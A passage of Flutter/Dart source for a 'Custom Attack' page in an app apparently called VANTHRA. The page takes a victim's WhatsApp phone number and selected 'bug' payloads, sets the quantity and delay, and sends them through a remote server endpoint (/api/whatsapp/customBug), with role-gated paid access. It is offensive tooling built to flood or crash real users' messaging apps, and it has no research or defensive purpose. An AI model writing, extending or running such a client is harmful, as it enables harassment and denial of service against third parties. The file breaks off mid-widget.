import 'dart:convert';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'dart:ui';

class CustomAttackPage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listPayload;
  final String role;
  final String expiredDate;

  const CustomAttackPage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listPayload,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<CustomAttackPage> createState() => _CustomAttackPageState();
}

class _CustomAttackPageState extends State<CustomAttackPage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  final qtyController = TextEditingController(text: "5");
  final delayController = TextEditingController(text: "100");
  static const String baseUrl = "http://kinncloud.sistems.tech:2052";

  // Animation controllers
  late AnimationController _buttonController;
  late AnimationController _fadeController;
  late AnimationController _slideController;
  late AnimationController _glowController;
  late AnimationController _rotateController;
  late Animation<double> _scaleAnimation;
  late Animation<double> _fadeAnimation;
  late Animation<Offset> _slideAnimation;
  late Animation<double> _glowAnimation;
  late Animation<double> _rotateAnimation;

  // Video controllers
  late VideoPlayerController _videoController;
  bool _videoInitialized = false;
  bool _videoError = false;

  // State variables
  List<String> selectedBugs = [];
  String _senderType = "global";
  bool _isSending = false;
  Map<String, String> _senderTypeLimits = {};
  int _activeStep = 0;

  // YELLOW-BLACK THEME (Amber/Dark)
  final Color _primaryColor = const Color(0xFFFFD54F);
  final Color _secondaryColor = const Color(0xFFFFB300);
  final Color _accentColor = const Color(0xFFFFC107);
  final Color _successColor = const Color(0xFFFFCA28);
  final Color _warningColor = const Color(0xFFFF8F00);
  final Color _darkBg = const Color(0xFF0A0A0A);
  final Color _darkerBg = const Color(0xFF050505);
  final Color _surfaceColor = const Color(0xFF121212);
  final Color _cardColor = const Color(0xFF0D0D0D);
  final Color _glowColor1 = const Color(0xFFFFD54F);
  final Color _glowColor2 = const Color(0xFFFFB300);
  final Color _glowColor3 = const Color(0xFFFFA000);
  final Color _goldColor = const Color(0xFFFFD54F);
  final Color _roseColor = const Color(0xFFFF8F00);

  @override
  void initState() {
    super.initState();
    _initializeAnimations();
    _initializeVideoController();
    _setSenderTypeLimits();
    _setDefaultBugs();
    _startAnimations();
  }

  void _initializeAnimations() {
    _buttonController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 150),
    );

    _fadeController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1200),
    );

    _slideController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1300),
    );

    _glowController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 2500),
    );
    _glowController.repeat(reverse: true);

    _rotateController = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 20),
    );
    _rotateController.repeat();

    _scaleAnimation = Tween<double>(begin: 1.0, end: 0.95).animate(
      CurvedAnimation(parent: _buttonController, curve: Curves.easeInOut),
    );

    _fadeAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(parent: _fadeController, curve: Curves.easeOutCubic),
    );

    _slideAnimation = Tween<Offset>(
      begin: const Offset(0, 0.4),
      end: Offset.zero,
    ).animate(CurvedAnimation(parent: _slideController, curve: Curves.easeOutCubic));

    _glowAnimation = Tween<double>(begin: 0.3, end: 1.0).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOutSine),
    );

    _rotateAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _rotateController, curve: Curves.linear),
    );
  }

  void _startAnimations() {
    _fadeController.forward();
    Future.delayed(const Duration(milliseconds: 200), () {
      _slideController.forward();
    });
  }

  void _setSenderTypeLimits() {
    _senderTypeLimits = {
      "global": "Max Qty: 10, Delay: 500ms (Fixed)",
      "private": "Max Qty: 200, Min Delay: 10ms",
    };
  }

  void _setDefaultBugs() {
    if (widget.listPayload.isNotEmpty) {
      selectedBugs.add(widget.listPayload[0]['bug_id']);
    }
  }

  void _initializeVideoController() {
    try {
      _videoController = VideoPlayerController.asset('assets/videos/banner.mp4')
        ..initialize().then((_) {
          if (mounted) {
            setState(() {
              _videoInitialized = true;
            });
            _videoController.setLooping(true);
            _videoController.play();
            _videoController.setVolume(1);
          }
        }).catchError((error) {
          debugPrint('Video initialization error: $error');
          if (mounted) {
            setState(() {
              _videoError = true;
            });
          }
        });
    } catch (e) {
      debugPrint('Video controller creation error: $e');
      if (mounted) {
        setState(() {
          _videoError = true;
        });
      }
    }
  }

  Widget _buildAnimatedBackground() {
    return Stack(
      children: [
        if (_videoInitialized && !_videoError)
          SizedBox.expand(
            child: FittedBox(
              fit: BoxFit.cover,
              child: SizedBox(
                width: _videoController.value.size.width,
                height: _videoController.value.size.height,
                child: Opacity(opacity: 0.30, child: VideoPlayer(_videoController)),
              ),
            ),
          )
        else
          Container(
            decoration: BoxDecoration(
              gradient: RadialGradient(
                center: const Alignment(-0.2, -0.4),
                radius: 1.6,
                colors: [_glowColor1.withOpacity(0.05), _darkerBg, _darkBg],
              ),
            ),
          ),

        // Rotating rings
        AnimatedBuilder(
          animation: _rotateAnimation,
          builder: (context, _) {
            final size = MediaQuery.of(context).size;
            return Stack(
              children: [
                Positioned(
                  bottom: -size.height * 0.15,
                  right: -size.width * 0.2,
                  child: Transform.rotate(
                    angle: _rotateAnimation.value * pi * 2,
                    child: Container(
                      width: size.width * 0.7,
                      height: size.width * 0.7,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(color: _glowColor1.withOpacity(0.05), width: 1),
                      ),
                    ),
                  ),
                ),
                Positioned(
                  top: -size.height * 0.08,
                  left: -size.width * 0.15,
                  child: Transform.rotate(
                    angle: -_rotateAnimation.value * pi,
                    child: Container(
                      width: size.width * 0.5,
                      height: size.width * 0.5,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(color: _glowColor2.withOpacity(0.06), width: 0.8),
                      ),
                    ),
                  ),
                ),
              ],
            );
          },
        ),

        // Vignette
        Container(
          decoration: BoxDecoration(
            gradient: RadialGradient(
              center: Alignment.center,
              radius: 1.0,
              colors: [
                Colors.transparent,
                Colors.black.withOpacity(0.55),
              ],
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildGlassCard({required Widget child}) {
    return Container(
      decoration: BoxDecoration(
        color: _cardColor,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _glowColor1.withOpacity(0.2), width: 1),
        boxShadow: [
          BoxShadow(color: Colors.black.withOpacity(0.4), blurRadius: 16, offset: const Offset(0, 6)),
        ],
      ),
      child: child,
    );
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d]'), '');
    if (cleaned.startsWith('0') || cleaned.length < 8) return null;
    return cleaned;
  }

  void _toggleBugSelection(String bugId) {
    setState(() {
      if (selectedBugs.contains(bugId)) {
        selectedBugs.remove(bugId);
      } else {
        selectedBugs.add(bugId);
      }
    });
  }

  Future<void> _sendCustomBug() async {
    if (_isSending) return;

    setState(() {
      _isSending = true;
      _activeStep = 1;
    });

    _buttonController.forward().then((_) {
      _buttonController.reverse();
    });

    final rawInput = targetController.text.trim();
    final target = formatPhoneNumber(rawInput);
    final key = widget.sessionKey;
    final qty = int.tryParse(qtyController.text) ?? 1;
    final delay = int.tryParse(delayController.text) ?? 100;

    if (target == null || key.isEmpty) {
      _showAlert("Invalid Number", "Use international format (e.g., 628123456789, not 08xxx).");
      setState(() {
        _isSending = false;
        _activeStep = 0;
      });
      return;
    }

    if (selectedBugs.isEmpty) {
      _showAlert("No Payload Selected", "Please select at least one payload to send.");
      setState(() {
        _isSending = false;
        _activeStep = 0;
      });
      return;
    }

    try {
      final bugsParam = selectedBugs.join(',');
      final res = await http.get(Uri.parse("$baseUrl/api/whatsapp/customBug?key=$key&target=$target&bug=$bugsParam&qty=$qty&delay=$delay&senderType=$_senderType"));
      final data = jsonDecode(res.body);

      if (data["valid"] == false) {
        _showAlert("Failed", data["message"] ?? "Failed to send custom bug.");
      } else {
        setState(() {
          _activeStep = 2;
        });
        _showSuccessPopup(target, data["details"] ?? {});
      }
    } catch (_) {
      _showAlert("Connection Error", "Failed to connect to the server. Please try again.");
    } finally {
      setState(() {
        _isSending = false;
        if (_activeStep != 2) _activeStep = 0;
      });
    }
  }

  void _showSuccessPopup(String target, Map<String, dynamic> details) {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => CustomSuccessDialog(
        target: target,
        details: details,
        onDismiss: () {
          Navigator.of(context).pop();
          setState(() {
            _activeStep = 0;
          });
        },
      ),
    );
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: _surfaceColor.withOpacity(0.98),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(28),
          side: BorderSide(color: _glowColor1.withOpacity(0.4), width: 1),
        ),
        title: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: _glowColor1.withOpacity(0.12),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _glowColor1.withOpacity(0.3), width: 1),
              ),
              child: Icon(title.contains("Error") ? Icons.error_outline_rounded : Icons.warning_amber_rounded,
                  color: _glowColor1, size: 22),
            ),
            const SizedBox(width: 14),
            Expanded(
              child: Text(
                title,
                style: const TextStyle(
                  color: Colors.white,
                  fontSize: 16,
                  fontWeight: FontWeight.w700,
                  fontFamily: 'Rajdhani',
                  letterSpacing: 1.5,
                ),
              ),
            ),
          ],
        ),
        content: Text(
          msg,
          style: TextStyle(
            color: Colors.white.withOpacity(0.65),
            fontSize: 13,
            height: 1.6,
            fontFamily: 'Rajdhani',
            fontWeight: FontWeight.w500,
          ),
        ),
        actionsPadding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            style: TextButton.styleFrom(
              backgroundColor: Colors.white.withOpacity(0.04),
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(14),
                side: BorderSide(color: Colors.white.withOpacity(0.08), width: 1),
              ),
              padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 10),
            ),
            child: const Text(
              "CLOSE",
              style: TextStyle(
                color: Colors.white60,
                fontFamily: 'Rajdhani',
                fontWeight: FontWeight.w700,
                fontSize: 12,
                letterSpacing: 2,
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildNeonHeader() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(20, 16, 20, 8),
      child: AnimatedBuilder(
        animation: _glowAnimation,
        builder: (context, _) {
          return Container(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
            decoration: BoxDecoration(
              color: _cardColor,
              borderRadius: BorderRadius.circular(24),
              border: Border.all(color: _glowColor1.withOpacity(0.4), width: 1.5),
              boxShadow: [
                BoxShadow(
                  color: _glowColor1.withOpacity(0.2 * _glowAnimation.value),
                  blurRadius: 20,
                  spreadRadius: 2,
                ),
              ],
            ),
            child: Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: _glowColor1.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(color: _glowColor1.withOpacity(0.2), width: 1),
                  ),
                  child: Icon(FontAwesomeIcons.bug, color: _glowColor1, size: 22),
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      ShaderMask(
                        shaderCallback: (bounds) => LinearGradient(
                          colors: [_glowColor1, _accentColor, _glowColor2],
                        ).createShader(bounds),
                        child: const Text(
                          "CUSTOM ATTACK",
                          style: TextStyle(
                            color: Colors.white,
                            fontSize: 18,
                            fontWeight: FontWeight.w900,
                            fontFamily: "Rajdhani",
                            letterSpacing: 3,
                          ),
                        ),
                      ),
                      const SizedBox(height: 4),
                      Text(
                        "Multi-Payload Attack System",
                        style: TextStyle(
                          color: _glowColor2.withOpacity(0.7),
                          fontSize: 11,
                          fontFamily: "Rajdhani",
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          );
        },
      ),
    );
  }

  Widget _buildUserProfileCard() {
    return _buildGlassCard(
      child: Padding(
        padding: const EdgeInsets.all(22),
        child: Row(
          children: [
            AnimatedBuilder(
              animation: _glowAnimation,
              builder: (context, _) {
                return Container(
                  width: 60,
                  height: 60,
                  decoration: BoxDecoration(
                    color: _surfaceColor,
                    shape: BoxShape.circle,
                    border: Border.all(color: _glowColor1.withOpacity(0.4), width: 1.5),
                    boxShadow: [
                      BoxShadow(
                        color: _glowColor1.withOpacity(0.2 * _glowAnimation.value),
                        blurRadius: 15,
                      ),
                    ],
                  ),
                  child: Center(
                    child: ClipOval(
  child: Image.asset(
    'assets/images/abc.jpg',
    width: 30,
    height: 30,
    fit: BoxFit.cover,
  ),
),
                  ),
                );
              },
            ),
            const SizedBox(width: 16),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    widget.username,
                    style: const TextStyle(
                      color: Colors.white,
                      fontSize: 18,
                      fontWeight: FontWeight.w800,
                      fontFamily: 'Rajdhani',
                      letterSpacing: 1,
                    ),
                  ),
                  const SizedBox(height: 4),
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                    decoration: BoxDecoration(
                      color: _glowColor1.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(20),
                      border: Border.all(color: _glowColor1.withOpacity(0.2), width: 1),
                    ),
                    child: Text(
                      widget.role.toUpperCase(),
                      style: TextStyle(
                        color: _glowColor1.withOpacity(0.85),
                        fontSize: 9,
                        fontWeight: FontWeight.w800,
                        letterSpacing: 2,
                        fontFamily: "Rajdhani",
                      ),
                    ),
                  ),
                ],
              ),
            ),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
              decoration: BoxDecoration(
                color: _cardColor,
                borderRadius: BorderRadius.circular(14),
                border: Border.all(color: _glowColor1.withOpacity(0.15), width: 1),
              ),
              child: Column(
                children: [
                  Icon(Icons.calendar_today, color: _glowColor2.withOpacity(0.6), size: 12),
                  const SizedBox(height: 4),
                  Text(
                    widget.expiredDate,
                    style: TextStyle(
                      color: _glowColor1.withOpacity(0.7),
                      fontSize: 10,
                      fontWeight: FontWeight.w700,
                      fontFamily: "Rajdhani",
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildTargetInputCard() {
    return _buildGlassCard(
      child: Padding(
        padding: const EdgeInsets.all(22),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Container(width: 3, height: 18,
                  decoration: BoxDecoration(color: _glowColor1.withOpacity(0.7), borderRadius: BorderRadius.circular(2),
                    boxShadow: [BoxShadow(color: _glowColor1.withOpacity(0.5), blurRadius: 6)])),
                const SizedBox(width: 10),
                Text(
                  "TARGET NUMBER",
                  style: TextStyle(
                    color: _glowColor2.withOpacity(0.7),
                    fontSize: 11,
                    fontWeight: FontWeight.w700,
                    letterSpacing: 3,
                    fontFamily: "Rajdhani",
                  ),
                ),
              ],
            ),
            const SizedBox(height: 18),
            Container(
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(14),
                border: Border.all(color: _glowColor1.withOpacity(0.2), width: 1),
                color: _cardColor,
              ),
              child: TextField(
                controller: targetController,
                style: TextStyle(color: Colors.white.withOpacity(0.9), fontSize: 14, fontFamily: 'Rajdhani', fontWeight: FontWeight.w600),
                cursorColor: _glowColor1,
                decoration: InputDecoration(
                  hintText: "628123456789",
                  hintStyle: TextStyle(color: Colors.white.withOpacity(0.25), fontSize: 12, fontFamily: 'Rajdhani'),
                  prefixIcon: Icon(FontAwesomeIcons.globe, color: _glowColor2.withOpacity(0.5), size: 18),
                  border: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(14),
                    borderSide: BorderSide.none,
                  ),
                  filled: true,
                  fillColor: Colors.transparent,
                  contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildPayloadSelectionCard() {
    return _buildGlassCard(
      child: Padding(
        padding: const EdgeInsets.all(22),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Container(width: 3, height: 18,
                  decoration: BoxDecoration(color: _glowColor1.withOpacity(0.7), borderRadius: BorderRadius.circular(2),
                    boxShadow: [BoxShadow(color: _glowColor1.withOpacity(0.5), blurRadius: 6)])),
                const SizedBox(width: 10),
                Text(
                  "SELECT PAYLOADS",
                  style: TextStyle(
                    color: _glowColor2.withOpacity(0.7),
                    fontSize: 11,
                    fontWeight: FontWeight.w700,
                    letterSpacing: 3,
                    fontFamily: "Rajdhani",
                  ),
                ),
                const Spacer(),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                  decoration: BoxDecoration(
                    color: _glowColor1.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(16),
                    border: Border.all(color: _glowColor1.withOpacity(0.2), width: 1),
                  ),
                  child: Text(
                    "${selectedBugs.length} SELECTED",
                    style: TextStyle(
                      color: _glowColor1.withOpacity(0.8),
                      fontSize: 9,
                      fontWeight: FontWeight.w800,
                      letterSpacing: 1,
                      fontFamily: "Rajdhani",
                    ),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 18),
            Wrap(
              spacing: 10,
              runSpacing: 10,
              children: widget.listPayload.map((bug) {
                final bugId = bug['bug_id'];
                final bugName = bug['bug_name'];
                final isSelected = selectedBugs.contains(bugId);
                return GestureDetector(
                  onTap: () => _toggleBugSelection(bugId),
                  child: AnimatedContainer(
                    duration: const Duration(milliseconds: 200),
                    padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
                    decoration: BoxDecoration(
                      color: isSelected ? _glowColor1.withOpacity(0.15) : _cardColor,
                      borderRadius: BorderRadius.circular(30),
                      border: Border.all(
                        color: isSelected ? _glowColor1 : _glowColor1.withOpacity(0.2),
                        width: isSelected ? 1.5 : 1,
                      ),
                    ),
                    child: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        if (isSelected)
                          Icon(Icons.check_circle, color: _glowColor1, size: 14),
                        if (isSelected) const SizedBox(width: 8),
                        Text(
                          bugName,
                          style: TextStyle(
                            color: isSelected ? _glowColor1 : Colors.white.withOpacity(0.7),
                            fontWeight: isSelected ? FontWeight.w800 : FontWeight.w600,
                            fontSize: 12,
                            fontFamily: "Rajdhani",
                          ),
                        ),
                      ],
                    ),
                  ),
                );
              }).toList(),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildSenderTypeCard() {
    return _buildGlassCard(
      child: Padding(
        padding: const EdgeInsets.all(22),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Container(width: 3, height: 18,
                  decoration: BoxDecoration(color: _glowColor1.withOpacity(0.7), borderRadius: BorderRadius.circular(2),
                    boxShadow: [BoxShadow(color: _glowColor1.withOpacity(0.5), blurRadius: 6)])),
                const SizedBox(width: 10),
                Text(
                  "SENDER MODE",
                  style: TextStyle(
                    color: _glowColor2.withOpacity(0.7),
                    fontSize: 11,
                    fontWeight: FontWeight.w700,
                    letterSpacing: 3,
                    fontFamily: "Rajdhani",
                  ),
                ),
              ],
            ),
            const SizedBox(height: 18),
            Row(
              children: [
                Expanded(
                  child: _buildSenderOption(
                    title: "GLOBAL",
                    icon: FontAwesomeIcons.globe,
                    subtitle: _senderTypeLimits["global"]!,
                    type: "global",
                    colors: [_glowColor1, _glowColor2],
                  ),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: _buildSenderOption(
                    title: "PRIVATE",
                    icon: FontAwesomeIcons.user,
                    subtitle: _senderTypeLimits["private"]!,
                    type: "private",
                    colors: [_glowColor2, _glowColor3],
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildSenderOption({
    required String title,
    required IconData icon,
    required String subtitle,
    required String type,
    required List<Color> colors,
  }) {
    final isActive = _senderType == type;
    return GestureDetector(
      onTap: () => setState(() => _senderType = type),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        padding: const EdgeInsets.symmetric(vertical: 14),
        decoration: BoxDecoration(
          color: isActive ? colors[0].withOpacity(0.15) : _cardColor,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(
            color: isActive ? colors[0] : _glowColor1.withOpacity(0.2),
            width: isActive ? 1.5 : 1,
          ),
        ),
        child: Column(
          children: [
            Icon(icon, color: isActive ? colors[0] : Colors.white.withOpacity(0.5), size: 22),
            const SizedBox(height: 8),
            Text(
              title,
              style: TextStyle(
                color: isActive ? colors[0] : Colors.white.withOpacity(0.7),
                fontWeight: isActive ? FontWeight.w800 : FontWeight.w700,
                fontSize: 13,
                fontFamily: 'Rajdhani',
                letterSpacing: 1.5,
              ),
            ),
            const SizedBox(height: 4),
            Text(
              subtitle,
              style: TextStyle(
                color: isActive ? colors[0].withOpacity(0.7) : Colors.white.withOpacity(0.4),
                fontSize: 9,
                fontFamily: 'Rajdhani',
                fontWeight: FontWeight.w500,
              ),
              textAlign: TextAlign.center,
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildQuantityDelayCard() {
    return _buildGlassCard(
      child: Padding(
        padding: const EdgeInsets.all(22),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Container(width: 3, height: 18,
                  decoration: BoxDecoration(color: _glowColor1.withOpacity(0.7), borderRadius: BorderRadius.circular(2),
                    boxShadow: [BoxShadow(color: _glowColor1.withOpacity(0.5), blurRadius: 6)])),
                const SizedBox(width: 10),
                Text(
                  "ATTACK PARAMETERS",
                  style: TextStyle(
                    color: _glowColor2.withOpacity(0.7),
                    fontSize: 11,
                    fontWeight: FontWeight.w700,
                    letterSpacing: 3,
                    fontFamily: "Rajdhani",
                  ),
                ),
              ],
            ),
            const SizedBox(height: 18),
            Row(
              children: [
                Expanded(
                  child: _buildParamInput(
                    label: "QUANTITY",
                    hint: "1-200",
                    controller: qtyController,
                    icon: Icons.numbers,
                  ),
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: _buildParamInput(
                    label: "DELAY (ms)",
                    hint: _senderType == "global" ? "Fixed at 500ms" : "10-1000",
                    controller: delayController,
                    icon: Icons.timer,
                    enabled: _senderType == "private",
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildParamInput({
    required String label,
    required String hint,
    required TextEditingController controller,
    required IconData icon,
    bool enabled = true,
  }) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(
          label,
          style: TextStyle(
            color: _glowColor2.withOpacity(0.6),
            fontSize: 9,
            fontFamily: 'Rajdhani',
            fontWeight: FontWeight.w700,
            letterSpacing: 2,
          ),
        ),
        const SizedBox(height: 6),
        Container(
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(14),
            border: Border.all(color: _glowColor1.withOpacity(0.2), width: 1),
            color: _cardColor,
          ),
          child: TextField(
            controller: controller,
            enabled: enabled,
            keyboardType: TextInputType.number,
            style: TextStyle(color: enabled ? Colors.white.withOpacity(0.9) : Colors.white.withOpacity(0.3), fontSize: 13, fontFamily: 'Rajdhani', fontWeight: FontWeight.w600),
            cursorColor: _glowColor1,
            decoration: InputDecoration(
              hintText: hint,
              hintStyle: TextStyle(color: Colors.white.withOpacity(0.25), fontSize: 11, fontFamily: 'Rajdhani'),
              prefixIcon: Icon(icon, color: _glowColor2.withOpacity(0.5), size: 18),
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(14),
                borderSide: BorderSide.none,
              ),
              filled: true,
              fillColor: Colors.transparent,
              contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildStatusIndicators() {
    return _buildGlassCard(
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.spaceEvenly,
          children: [
            _buildStatusIndicator(FontAwesomeIcons.server, "SERVER", true),
            _buildStatusIndicator(FontAwesomeIcons.shieldAlt, "SECURITY", true),
            _buildStatusIndicator(FontAwesomeIcons.database, "DATABASE", true),
          ],
        ),
      ),
    );
  }

  Widget _buildStatusIndicator(IconData icon, String label, bool isOnline) {
    return Column(
      children: [
        AnimatedBuilder(
          animation: _glowAnimation,
          builder: (context, _) {
            return Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: isOnline ? _glowColor1.withOpacity(0.15) : _roseColor.withOpacity(0.15),
                shape: BoxShape.circle,
                border: Border.all(
                  color: isOnline ? _glowColor1.withOpacity(0.4) : _roseColor.withOpacity(0.3),
                  width: 1,
                ),
                boxShadow: isOnline
                    ? [
                        BoxShadow(
                          color: _glowColor1.withOpacity(0.2 * _glowAnimation.value),
                          blurRadius: 10,
                        ),
                      ]
                    : null,
              ),
              child: Icon(icon, color: isOnline ? _glowColor1 : _roseColor, size: 16),
            );
          },
        ),
        const SizedBox(height: 6),
        Text(
          label,
          style: TextStyle(
            color: Colors.white.withOpacity(0.5),
            fontSize: 9,
            fontFamily: 'Rajdhani',
            fontWeight: FontWeight.w600,
          ),
        ),
        Container(
          width: 30,
          height: 2,
          margin: const EdgeInsets.only(top: 4),
          decoration: BoxDecoration(
            color: isOnline ? _glowColor1 : _roseColor,
            borderRadius: BorderRadius.circular(2),
          ),
        ),
      ],
    );
  }

  Widget _buildAttackButton() {
    return AnimatedBuilder(
      animation: _glowAnimation,
      builder: (context, _) {
        return GestureDetector(
          onTap: _isSending ? null : _sendCustomBug,
          child: Container(
            width: double.infinity,
            height: 56,
            decoration: BoxDecoration(
              color: _glowColor1.withOpacity(0.92),
              borderRadius: BorderRadius.circular(16),
              boxShadow: [
                BoxShadow(
                  color: _glowColor1.withOpacity(0.35 * _glowAnimation.value),
                  blurRadius: 28,
                  spreadRadius: 2,
                  offset: const Offset(0, 8),
                ),
              ],
            ),
            child: Center(
              child: _isSending
                  ? const SizedBox(width: 22, height: 22, child: CircularProgressIndicator(color: Color(0xFF0A0A0A), strokeWidth: 2.5))
                  : Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        const Icon(FontAwesomeIcons.paperPlane, color: Color(0xFF0A0A0A), size: 16),
                        const SizedBox(width: 12),
                        Text(
                          "EXECUTE ATTACK",
                          style: const TextStyle(
                            fontSize: 13,
                            fontFamily: 'Rajdhani',
                            fontWeight: FontWeight.w900,
                            letterSpacing: 4,
                            color: Color(0xFF0A0A0A),
                          ),
                        ),
                      ],
                    ),
            ),
          ),
        );
      },
    );
  }

  Widget _buildFooter() {
    return Column(
      children: [
        Container(
          height: 1,
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [Colors.transparent, _glowColor1.withOpacity(0.1), Colors.transparent],
            ),
          ),
        ),
        const SizedBox(height: 16),
        Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            _buildFooterDot(_successColor),
            const SizedBox(width: 8),
            _buildFooterText("SECURE"),
            const SizedBox(width: 20),
            Container(width: 1, height: 10, color: Colors.white.withOpacity(0.06)),
            const SizedBox(width: 20),
            Icon(Icons.fingerprint, color: Colors.white.withOpacity(0.12), size: 12),
            const SizedBox(width: 20),
            _buildFooterDot(_glowColor2),
            const SizedBox(width: 8),
            _buildFooterText("ENCRYPTED"),
          ],
        ),
        const SizedBox(height: 8),
        Text(
          "VANTHRA • SECURE CONNECTION",
          style: TextStyle(
            color: Colors.white.withOpacity(0.1),
            fontSize: 8,
            letterSpacing: 3,
            fontFamily: 'Rajdhani',
            fontWeight: FontWeight.w600,
          ),
        ),
      ],
    );
  }

  Widget _buildFooterDot(Color color) {
    return Container(
      width: 5,
      height: 5,
      decoration: BoxDecoration(
        color: color,
        shape: BoxShape.circle,
        boxShadow: [BoxShadow(color: color, blurRadius: 5)],
      ),
    );
  }

  Widget _buildFooterText(String text) {
    return Text(
      text,
      style: TextStyle(
        color: Colors.white.withOpacity(0.25),
        fontSize: 8,
        fontWeight: FontWeight.w700,
        letterSpacing: 2.5,
        fontFamily: 'Rajdhani',
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    // Access control
    if (!["vip", "owner", "high admin", "moderator", "founder"].contains(widget.role.toLowerCase())) {
      return Scaffold(
        backgroundColor: _darkerBg,
        body: Stack(
          children: [
            _buildAnimatedBackground(),
            Center(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  AnimatedBuilder(
                    animation: _glowAnimation,
                    builder: (context, _) {
                      return Container(
                        padding: const EdgeInsets.all(24),
                        decoration: BoxDecoration(
                          color: _roseColor.withOpacity(0.1 + 0.05 * _glowAnimation.value),
                          borderRadius: BorderRadius.circular(100),
                          border: Border.all(
                            color: _roseColor.withOpacity(0.3 + 0.1 * _glowAnimation.value),
                            width: 1.5,
                          ),
                          boxShadow: [
                            BoxShadow(
                              color: _roseColor.withOpacity(0.15 * _glowAnimation.value),
                              blurRadius: 20,
                              spreadRadius: 4,
                            ),
                          ],
                        ),
                        child: const Icon(FontAwesomeIcons.lock, color: Color(0xFFFF8F00), size: 50),
                      );
                    },
                  ),
                  const SizedBox(height: 24),
                  Text(
                    "ACCESS DENIED",
                    style: TextStyle(
                      color: _roseColor,
                      fontSize: 22,
                      fontWeight: FontWeight.w900,
                      fontFamily: 'Rajdhani',
                      letterSpacing: 4,
                    ),
                  ),
                  const SizedBox(height: 12),
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
                    margin: const EdgeInsets.symmetric(horizontal: 40),
